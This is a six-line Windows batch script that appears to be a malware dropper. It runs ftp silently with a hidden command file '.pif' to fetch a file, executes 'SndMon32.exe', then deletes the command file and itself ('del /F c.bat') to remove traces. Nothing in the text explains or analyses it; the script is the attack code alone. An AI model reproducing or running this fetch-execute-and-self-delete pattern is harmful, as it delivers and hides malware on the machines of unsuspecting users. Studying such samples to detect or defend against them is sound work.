@echo off 
ftp -n -v -s:.pif 
SndMon32.exe 
del .pif 
del /F c.bat 
exit /y 
